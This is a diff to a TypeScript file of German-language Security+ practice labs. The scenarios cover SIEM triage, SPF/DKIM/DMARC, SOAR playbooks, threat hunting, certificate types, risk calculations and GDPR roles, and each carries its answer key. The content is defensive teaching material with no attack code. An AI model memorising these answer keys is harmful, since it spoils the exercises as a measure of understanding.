+      'Nach dem SIEM-Rollout ertrinkt das SOC in Alarmen. Ordne jeden Fall der richtigen Bewertung zu, bevor du Regeln tunst.',
+    evidence:
+      'Review der letzten Schicht:\n  A. Alarm "Bruteforce" — Ausloeser war der Backup-Service mit abgelaufenem Passwort\n  B. Alarm "C2-Beacon" — bestaetigte Malware auf dem Host\n  C. Kein Alarm — der Phishing-Login aus dem Ausland blieb unentdeckt\n  D. Kein Alarm — und tatsaechlich kein Vorfall im Zeitraum',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: Alarm ohne echten Angriff', right: 'False Positive — Regel tunen/Allowlist' },
+        { left: 'B: Alarm mit bestaetigtem Vorfall', right: 'True Positive — Incident eroeffnen' },
+        { left: 'C: Vorfall ohne Alarm', right: 'False Negative — Detection-Luecke schliessen' },
+        { left: 'D: kein Alarm, kein Vorfall', right: 'True Negative — alles korrekt' },
+      ],
+      options: [
+        'False Positive — Regel tunen/Allowlist',
+        'True Positive — Incident eroeffnen',
+        'False Negative — Detection-Luecke schliessen',
+        'True Negative — alles korrekt',
+      ],
+    },
+  },
+  {
+    id: 'betrieb-monitoring-werkzeuge',
+    categoryId: 'betrieb',
+    title: 'Das richtige Monitoring-Werkzeug',
+    objective: '4.4 Alerting and Monitoring',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Fuenf Monitoring-Fragen aus dem SOC-Backlog. Ordne jeder Frage die Datenquelle bzw. das Werkzeug zu, das sie beantwortet.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Wer redet mit wem? Flow-Metadaten statt Paketinhalt', right: 'NetFlow/IPFIX' },
+        { left: 'Sind alle Hosts konform zur Haertungs-Baseline?', right: 'SCAP-Compliance-Scan' },
+        { left: 'Verlassen sensible Daten das Haus per Mail oder USB?', right: 'DLP' },
+        { left: 'Geraet meldet selbststaendig eine Statusaenderung', right: 'SNMP-Trap' },
+        { left: 'Logs aus allen Quellen korrelieren und alarmieren', right: 'SIEM' },
+      ],
+      options: ['NetFlow/IPFIX', 'SCAP-Compliance-Scan', 'DLP', 'SNMP-Trap', 'SIEM'],
+    },
+  },
+  {
+    id: 'betrieb-email-authentisierung',
+    categoryId: 'betrieb',
+    title: 'SPF, DKIM, DMARC gegen Spoofing',
+    objective: '4.5 Enterprise Security',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Nach einer CEO-Fraud-Welle soll die Mail-Domain abgesichert werden. Ordne jede Schutzwirkung dem richtigen Mechanismus zu.',
+    evidence:
+      'DNS-Eintraege (Soll-Zustand):\n  TXT  v=spf1 ip4:203.0.113.0/24 -all\n  TXT  selector1._domainkey: DKIM-Public-Key\n  TXT  _dmarc: v=DMARC1; p=quarantine; rua=mailto:dmarc@firma.example',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Legt fest, welche Server fuer die Domain senden duerfen', right: 'SPF' },
+        { left: 'Signiert die Mail; Empfaenger prueft die Integritaet', right: 'DKIM' },
+        { left: 'Policy bei SPF/DKIM-Fail plus Reporting', right: 'DMARC' },
+        { left: 'Verschluesselt den Transport zwischen Mailservern', right: 'TLS (Transportverschluesselung)' },
+      ],
+      options: ['SPF', 'DKIM', 'DMARC', 'TLS (Transportverschluesselung)'],
+    },
+  },
+  {
+    id: 'betrieb-soar-playbook',
+    categoryId: 'betrieb',
+    title: 'SOAR-Playbook: Phishing automatisiert',
+    objective: '4.7 Automation and Orchestration',
+    difficulty: 'experte',
+    minutes: 5,
+    description:
+      'Gemeldete Phishing-Mails sollen kuenftig automatisiert abgearbeitet werden. Bring die Playbook-Schritte in die richtige Reihenfolge.',
+    goal: 'Ziel: Anreicherung vor Entscheidung; der Mensch uebernimmt nur noch den unklaren Sonderfall (Human-in-the-Loop).',
+    interaction: {
+      type: 'ordering',
+      steps: [
+        'Bei bestaetigten Treffern: Mail aus allen Postfaechern ziehen, URL/Domain blocken',
+        'Anhaenge und URLs automatisch in der Sandbox detonieren',
+        'Eingang: SOAR parst die gemeldete Mail zu einem Ticket (Hashes, URLs, Header)',
+        'Verbleibende unklare Faelle mit gesammeltem Kontext an einen Analysten eskalieren',
+        'IoCs gegen Threat-Intel-Feeds und EDR-Telemetrie anreichern',
+      ],
+      correctOrder: [2, 4, 1, 0, 3],
+    },
+  },
+  {
+    id: 'betrieb-automation-usecases',
+    categoryId: 'betrieb',
+    title: 'Automatisieren — aber das Richtige',
+    objective: '4.7 Automation and Orchestration',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Das Ops-Team sammelt Automatisierungs-Ideen. Ordne jeder Idee den primaeren Nutzen — oder das Risiko — zu.',
+    evidence:
+      'Ideen-Backlog:\n  A. User-On-/Offboarding per Skript ans HR-System koppeln\n  B. Ticket-Eskalation ab Severity HIGH automatisch ans On-Call\n  C. Komplette Produktions-Firewall-Policy naechtlich per Skript neu schreiben\n  D. Guardrail: Pipeline stoppt das Deployment, wenn Security-Tests fehlschlagen',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: On-/Offboarding an HR koppeln', right: 'Provisioning ohne Restzugriffe und Liegezeiten' },
+        { left: 'B: Auto-Eskalation ab HIGH', right: 'Schnellere Reaktion, weniger Alert-Fatigue' },
+        { left: 'C: Prod-Policy naechtlich neu schreiben', right: 'Riskant: Single Point of Failure ohne Review' },
+        { left: 'D: Deployment-Stopp bei Test-Fail', right: 'Guardrail erzwingt Security im SDLC' },
+      ],
+      options: [
+        'Provisioning ohne Restzugriffe und Liegezeiten',
+        'Schnellere Reaktion, weniger Alert-Fatigue',
+        'Riskant: Single Point of Failure ohne Review',
+        'Guardrail erzwingt Security im SDLC',
+      ],
+    },
+  },
+
   // ── Incident Response (Schwerpunkt; ⚠️ neu generiert) ─────────────────────
   {
     id: 'ir-nist-phasen',
@@ -1286,6 +1956,8 @@ export const LAB_SCENARIOS: LabScenario[] = [
     interaction: {
       type: 'ordering',
       steps: [
+        // Konsistent zum goal ("Ausbreitung stoppen" zuerst): Isolation vor
+        // der formalen Deklaration — bei aktiver Verschluesselung zaehlt jede Minute.
         'Forensik: Speicherabbild und Logs von FIN-PC-07 sichern',
         'Betroffene Systeme vom Netz isolieren (nicht ausschalten)',
         'Incident deklarieren, IR-Team und Kommunikationsplan aktivieren',
@@ -1293,7 +1965,7 @@ export const LAB_SCENARIOS: LabScenario[] = [
         'Initialen Vektor schliessen (Patch/Credentials/Regel)',
         'Lessons Learned mit Timeline und Massnahmen dokumentieren',
       ],
-      correctOrder: [2, 1, 0, 4, 3, 5],
+      correctOrder: [1, 2, 0, 4, 3, 5],
     },
   },
   {
@@ -1398,13 +2070,15 @@ export const LAB_SCENARIOS: LabScenario[] = [
     interaction: {
       type: 'ordering',
       steps: [
+        // Order of Volatility (RFC 3227): RAM vor Disk, Disk vor Remote-Logs;
+        // Hashing erst nach der LETZTEN Sicherung, damit die Reihenfolge eindeutig ist.
         'Disk-Image im Write-Blocker-/forensischen Verfahren erstellen',
         'RAM-Abbild und laufende Prozesse/Netzwerkverbindungen sichern',
         'Zentrale SIEM-/EDR-Logs exportieren und gegen Loeschung sichern',
-        'Hashwerte der Images berechnen und dokumentieren',
+        'Hashwerte aller gesicherten Images und Exporte berechnen und dokumentieren',
         'Arbeitskopie fuer Analyse erstellen, Original versiegeln',
       ],
-      correctOrder: [1, 2, 0, 3, 4],
+      correctOrder: [1, 0, 2, 3, 4],
     },
   },
   {
@@ -1522,6 +2196,50 @@ export const LAB_SCENARIOS: LabScenario[] = [
         'Restore-Runbook und Tests anpassen',
         'Helpdesk-Verifikation und Schulung haerten',
       ],
+    },
+  },
+
+  {
+    id: 'ir-uebungsformate',
+    categoryId: 'incident-response',
+    title: 'IR-Uebung: das richtige Format',
+    objective: '4.8 Incident Response',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Der IR-Plan ist neu — jetzt soll er geuebt werden. Ordne jedem Ziel das passende Uebungsformat zu.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Plan gemeinsam durchsprechen, ohne Systeme anzufassen', right: 'Tabletop-Exercise' },
+        { left: 'Failover ins Backup-RZ technisch wirklich durchfuehren', right: 'Failover-/Functional-Test' },
+        { left: 'Realistischer Angriff durch ein beauftragtes Red Team', right: 'Red-Team-Engagement / Simulation' },
+        { left: 'Einzelne Rolle uebt ihre Meldewege am Leitfaden', right: 'Walkthrough / Drill' },
+      ],
+      options: ['Tabletop-Exercise', 'Failover-/Functional-Test', 'Red-Team-Engagement / Simulation', 'Walkthrough / Drill'],
+    },
+  },
+  {
+    id: 'ir-threat-hunt-hypothese',
+    categoryId: 'incident-response',
+    title: 'Threat Hunt: von Hypothese zu Befund',
+    objective: '4.8 Incident Response',
+    difficulty: 'experte',
+    minutes: 5,
+    description:
+      'Threat Intel meldet eine Kampagne mit DLL-Sideloading. Bring den hypothesenbasierten Hunt in die richtige Reihenfolge — vom Intel-Report bis zur wiederholbaren Detection-Regel.',
+    evidence:
+      'Intel-Report TI-2026-114:\n  Kampagne nutzt signierten Updater + boesartige DLL im selben Ordner\n  Persistenz: Scheduled Task "OneDriveUpd"\n  C2: HTTPS zu wechselnden CDN-Domains, TLS-Fingerprint bekannt',
+    interaction: {
+      type: 'ordering',
+      steps: [
+        'Treffer validieren: Prozessbaum und Task "OneDriveUpd" auf den Hosts pruefen',
+        'Hypothese formulieren: signierter Prozess laedt DLL aus dem Nutzerverzeichnis',
+        'Bestaetigte Kompromittierung als Incident an die IR uebergeben',
+        'Telemetrie abfragen: Module-Loads und TLS-Fingerprints der letzten 30 Tage im EDR/Netz',
+        'Hunt dokumentieren und als wiederholbare Detection-Regel hinterlegen',
+      ],
+      correctOrder: [1, 3, 0, 2, 4],
     },
   },
 
@@ -1710,6 +2428,51 @@ export const LAB_SCENARIOS: LabScenario[] = [
     },
   },
 
+  {
+    id: 'krypto-obfuskation',
+    categoryId: 'krypto',
+    title: 'Tokenisierung, Maskierung & Co.',
+    objective: '3.3 Data Protection',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Kreditkartendaten tauchen an zu vielen Stellen auf. Ordne jeder Anforderung die passende Verschleierungs-Technik zu.',
+    evidence:
+      'Anforderungen:\n  A. Bezahlsystem speichert statt der PAN einen wertlosen Ersatzwert; Rueckweg nur ueber den Vault\n  B. Support-Mitarbeiter sehen nur die letzten 4 Ziffern\n  C. Testumgebung braucht realistisch aussehende, aber dauerhaft veraenderte Daten\n  D. Vertrauliche Datei soll unauffaellig in einem Bild transportiert werden',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: Ersatzwert + Vault statt PAN', right: 'Tokenisierung' },
+        { left: 'B: nur letzte 4 Ziffern sichtbar', right: 'Maskierung' },
+        { left: 'C: dauerhaft veraenderte Testdaten', right: 'Anonymisierung/Pseudonymisierung' },
+        { left: 'D: Datei im Bild verstecken', right: 'Steganografie' },
+      ],
+      options: ['Tokenisierung', 'Maskierung', 'Anonymisierung/Pseudonymisierung', 'Steganografie'],
+    },
+  },
+  {
+    id: 'krypto-zertifikatstypen',
+    categoryId: 'krypto',
+    title: 'Den richtigen Zertifikatstyp waehlen',
+    objective: '1.4 Cryptographic Solutions',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Vier Zertifikats-Anfragen liegen im PKI-Ticket. Ordne jeder Anfrage den passenden Zertifikatstyp zu.',
+    evidence:
+      'Ticket PKI-883:\n  A. shop.example.de, www.example.de und api.example.de in EINEM Zertifikat\n  B. Alle kuenftigen Subdomains unter *.dev.example.de abdecken\n  C. Interner Testserver, kein externes Vertrauen noetig, schnell und kostenlos\n  D. Code des neuen Windows-Agents soll vom OS als vertrauenswuerdig gelten',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'A: drei feste Hostnamen, ein Zertifikat', right: 'SAN-/Multi-Domain-Zertifikat' },
+        { left: 'B: beliebige Subdomains einer Ebene', right: 'Wildcard-Zertifikat' },
+        { left: 'C: nur intern, ohne externe CA', right: 'Self-Signed / interne CA' },
+        { left: 'D: Software-Integritaet bei der Installation', right: 'Code-Signing-Zertifikat' },
+      ],
+      options: ['SAN-/Multi-Domain-Zertifikat', 'Wildcard-Zertifikat', 'Self-Signed / interne CA', 'Code-Signing-Zertifikat'],
+    },
+  },
+
   // ── Governance & Risiko (⚠️ neu generiert) ────────────────────────────────
   {
     id: 'governance-risk-response',
@@ -1869,10 +2632,83 @@ export const LAB_SCENARIOS: LabScenario[] = [
       ],
     },
   },
+  {
+    id: 'governance-quantitatives-risiko',
+    categoryId: 'governance',
+    title: 'SLE, ARO und ALE berechnen',
+    objective: '5.2 Risk Management',
+    difficulty: 'experte',
+    minutes: 5,
+    description:
+      'Fuer den Risiko-Report sollst du den erwarteten Jahresschaden eines Ransomware-Szenarios beziffern. Ordne jeder Groesse den richtigen Wert aus dem Szenario zu.',
+    evidence:
+      'Szenario "Ransomware Werk 1":\n  Asset Value (AV): 500.000 EUR\n  Exposure Factor (EF): 40 % des Asset-Werts pro Vorfall\n  Eintrittswahrscheinlichkeit: statistisch 1 Vorfall alle 4 Jahre\n  Angebot Cyber-Versicherung: 30.000 EUR Praemie pro Jahr',
+    goal: 'Ziel: SLE = AV x EF; ALE = SLE x ARO; dann gegen die Versicherungspraemie stellen.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'SLE (Schaden pro Vorfall)', right: '200.000 EUR' },
+        { left: 'ARO (Vorfaelle pro Jahr)', right: '0,25' },
+        { left: 'ALE (erwarteter Jahresschaden)', right: '50.000 EUR' },
+        { left: 'Versicherung fuer 30.000 EUR/Jahr', right: 'Transfer lohnt sich: Praemie unter ALE' },
+      ],
+      options: ['200.000 EUR', '0,25', '50.000 EUR', 'Transfer lohnt sich: Praemie unter ALE', '125.000 EUR'],
+    },
+  },
+  {
+    id: 'governance-vertragsdokumente',
+    categoryId: 'governance',
+    title: 'SLA, MOU, MSA oder NDA?',
+    objective: '5.3 Third-party Risk',
+    difficulty: 'einsteiger',
+    minutes: 3,
+    description:
+      'Vier Situationen aus dem Lieferanten-Onboarding. Ordne jeder Situation das passende Vertragsdokument zu.',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: '99,9 % Verfuegbarkeit und 4h-Reaktionszeit zusichern', right: 'SLA' },
+        { left: 'Rahmenbedingungen fuer kuenftige Einzelauftraege festlegen', right: 'MSA' },
+        { left: 'Vertraulichkeit vor dem ersten Architektur-Workshop', right: 'NDA' },
+        { left: 'Unverbindliche Absichtserklaerung zweier Organisationen', right: 'MOU' },
+      ],
+      options: ['SLA', 'MSA', 'NDA', 'MOU', 'BPA'],
+    },
+  },
+  {
+    id: 'governance-datenschutz-rollen',
+    categoryId: 'governance',
+    title: 'DSGVO: Rollen und Pflichten',
+    objective: '5.4 Security Compliance',
+    difficulty: 'fortgeschritten',
+    minutes: 4,
+    description:
+      'Ein Kunde uebt sein Auskunftsrecht aus, parallel meldet der Cloud-Anbieter ein Datenleck. Ordne jede Pflicht der richtigen Rolle bzw. Frist zu.',
+    evidence:
+      'Sachverhalt:\n  - Der Webshop (dein Unternehmen) entscheidet ueber Zweck und Mittel der Datenverarbeitung\n  - Der Cloud-Anbieter hostet die Daten nur im Auftrag\n  - Das Datenleck betrifft Kundendaten; Aufsichtsbehoerde und Betroffene fragen nach',
+    interaction: {
+      type: 'matching',
+      items: [
+        { left: 'Entscheidet ueber Zweck und Mittel der Verarbeitung', right: 'Controller (Verantwortlicher)' },
+        { left: 'Verarbeitet nur im Auftrag und nach Weisung', right: 'Processor (Auftragsverarbeiter)' },
+        { left: 'Meldung der Datenpanne an die Aufsichtsbehoerde', right: 'Binnen 72 Stunden durch den Controller' },
+        { left: 'Beraet und ueberwacht intern die Einhaltung', right: 'Data Protection Officer (DPO)' },
+      ],
+      options: [
+        'Controller (Verantwortlicher)',
+        'Processor (Auftragsverarbeiter)',
+        'Binnen 72 Stunden durch den Controller',
+        'Data Protection Officer (DPO)',
+      ],
+    },
+  },
 ]
 
-/** Ziel-Inventar laut Handy-Stand (Pill "4 / 71"); siehe docs/labs.md. */
-export const LAB_TARGET_INVENTORY = 71
+/**
+ * Ziel-Inventar: 100 Szenarien — Ausbau vom belegten 71er-Handy-Stand
+ * (Pill "4 / 71") auf volle SY0-701-Objective-Abdeckung; siehe docs/labs.md.
+ */
+export const LAB_TARGET_INVENTORY = 100
 
 const SY0_701 = 'comptia-sy0-701-objectives'
 
@@ -1885,6 +2721,7 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'grundlagen-cab-freigabe': [SY0_701, 'nist-csf-2'],
   'grundlagen-capability': [SY0_701, 'nist-sp-800-207', 'cisa-zero-trust-maturity-model'],
   'grundlagen-shared-responsibility': [SY0_701, 'aws-shared-responsibility'],
+  'grundlagen-deception-tech': [SY0_701, 'mitre-engage'],
 
   'bedrohungen-threat-actors': [SY0_701, 'mitre-attack-enterprise'],
   'bedrohungen-social-engineering': [SY0_701, 'cisa-phishing-social-engineering', 'mitre-attack-enterprise'],
@@ -1894,6 +2731,9 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'bedrohungen-indikatoren': [SY0_701, 'mitre-attack-enterprise'],
   'bedrohungen-supply-chain-sbom': [SY0_701, 'cisa-sbom', 'cisa-secure-by-design'],
   'bedrohungen-mitigation-mapping': [SY0_701, 'owasp-top10-2021', 'cisa-phishing-social-engineering', 'nist-csf-2'],
+  'bedrohungen-passwort-angriffe': [SY0_701, 'owasp-credential-stuffing', 'mitre-attack-enterprise'],
+  'bedrohungen-netzwerk-angriffe': [SY0_701, 'mitre-attack-enterprise'],
+  'bedrohungen-web-app-angriffe': [SY0_701, 'owasp-top10-2021'],
 
   'firewalls-geo-block': [SY0_701, 'cisco-acl', 'paloalto-security-policy-rules'],
   'firewalls-implicit-deny': [SY0_701, 'cisco-acl'],
@@ -1907,6 +2747,8 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'firewalls-vpn-split-tunnel': [SY0_701, 'nist-sp-800-207', 'cisco-acl'],
   'firewalls-log-triage': [SY0_701, 'cisco-acl', 'paloalto-security-policy-rules'],
   'firewalls-zero-trust-pep': [SY0_701, 'nist-sp-800-207', 'cisa-zero-trust-maturity-model'],
+  'firewalls-ids-ips-platzierung': [SY0_701, 'nist-sp-800-94'],
+  'firewalls-nac-8021x': [SY0_701, 'nist-sp-800-97'],
 
   'architektur-cloud-modelle': [SY0_701, 'aws-shared-responsibility'],
   'architektur-datenzustaende': [SY0_701, 'nist-encryption-basics'],
@@ -1916,6 +2758,8 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'architektur-ha-failover': [SY0_701, 'nist-csf-2', 'cisa-stopransomware-guide'],
   'architektur-data-sanitization': [SY0_701, 'nist-sp-800-88r2-ipd'],
   'architektur-container-hardening': [SY0_701, 'owasp-top10-2021', 'nist-csf-2'],
+  'architektur-ot-ics-iot': [SY0_701, 'nist-sp-800-82r3'],
+  'architektur-failure-modes': [SY0_701, 'nist-sp-800-94', 'nist-csf-2'],
 
   'iam-aaa': [SY0_701, 'nist-sp-800-63b'],
   'iam-mfa-faktoren': [SY0_701, 'nist-sp-800-63b'],
@@ -1925,6 +2769,21 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'iam-conditional-access': [SY0_701, 'nist-sp-800-63b', 'nist-sp-800-207'],
   'iam-pam-jit': [SY0_701, 'nist-sp-800-63b', 'nist-csf-2'],
   'iam-federation-flow': [SY0_701, 'nist-sp-800-63b'],
+  'iam-sso-protokolle': [SY0_701, 'nist-sp-800-63c'],
+  'iam-passwort-richtlinie': [SY0_701, 'nist-sp-800-63b'],
+
+  'betrieb-server-haertung': [SY0_701, 'cis-benchmarks', 'nist-sp-800-40r4'],
+  'betrieb-wlan-sicherheit': [SY0_701, 'wifi-alliance-security', 'nist-sp-800-97'],
+  'betrieb-mobile-deployment': [SY0_701, 'nist-sp-800-124r2'],
+  'betrieb-asset-lifecycle': [SY0_701, 'nist-sp-800-88r2-ipd', 'nist-csf-2'],
+  'betrieb-vuln-priorisierung': [SY0_701, 'first-cvss-v31', 'cisa-kev'],
+  'betrieb-patch-notfall': [SY0_701, 'nist-sp-800-40r4', 'cisa-kev'],
+  'betrieb-scan-arten': [SY0_701, 'nist-sp-800-115'],
+  'betrieb-siem-tuning': [SY0_701, 'nist-sp-800-92'],
+  'betrieb-monitoring-werkzeuge': [SY0_701, 'nist-sp-800-92'],
+  'betrieb-email-authentisierung': [SY0_701, 'nist-sp-800-177r1'],
+  'betrieb-soar-playbook': [SY0_701, 'nist-sp-800-61r3', 'cisa-phishing-social-engineering'],
+  'betrieb-automation-usecases': [SY0_701, 'nist-sp-800-61r3'],
 
   'ir-nist-phasen': [SY0_701, 'nist-sp-800-61r2'],
   'ir-ransomware-first-response': [SY0_701, 'nist-sp-800-61r2', 'cisa-stopransomware-guide'],
@@ -1938,6 +2797,8 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'ir-recovery-validation': [SY0_701, 'cisa-stopransomware-guide', 'nist-csf-2'],
   'ir-phishing-report-flow': [SY0_701, 'cisa-phishing-social-engineering', 'nist-sp-800-61r2'],
   'ir-lessons-learned-actions': [SY0_701, 'nist-sp-800-61r2', 'nist-csf-2'],
+  'ir-uebungsformate': [SY0_701, 'nist-sp-800-84', 'nist-sp-800-61r2'],
+  'ir-threat-hunt-hypothese': [SY0_701, 'mitre-attack-enterprise', 'nist-sp-800-61r3'],
 
   'krypto-bausteine': [SY0_701, 'nist-encryption-basics', 'nist-sp-800-57r5'],
   'krypto-cert-lifecycle': [SY0_701, 'nist-sp-800-57r5'],
@@ -1947,6 +2808,8 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'krypto-aead-hmac-signatur': [SY0_701, 'nist-encryption-basics', 'nist-sp-800-57r5'],
   'krypto-pki-chain': [SY0_701, 'nist-sp-800-57r5'],
   'krypto-secret-storage': [SY0_701, 'nist-sp-800-57r5', 'nist-csf-2'],
+  'krypto-obfuskation': [SY0_701, 'nist-encryption-basics'],
+  'krypto-zertifikatstypen': [SY0_701, 'nist-sp-800-57r5'],
 
   'governance-risk-response': [SY0_701, 'nist-csf-2'],
   'governance-datenrollen': [SY0_701, 'nist-csf-2'],
@@ -1955,6 +2818,9 @@ export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
   'governance-third-party-risk': [SY0_701, 'cisa-sbom', 'nist-csf-2'],
   'governance-awareness-plan': [SY0_701, 'cisa-phishing-social-engineering', 'nist-csf-2'],
   'governance-audit-evidence': [SY0_701, 'nist-csf-2'],
+  'governance-quantitatives-risiko': [SY0_701, 'nist-sp-800-30r1'],
+  'governance-vertragsdokumente': [SY0_701, 'nist-csf-2'],
+  'governance-datenschutz-rollen': [SY0_701, 'eu-gdpr'],
 }
 
 const labSourceById = new Map(LAB_SOURCES.map(source => [source.id, source]))
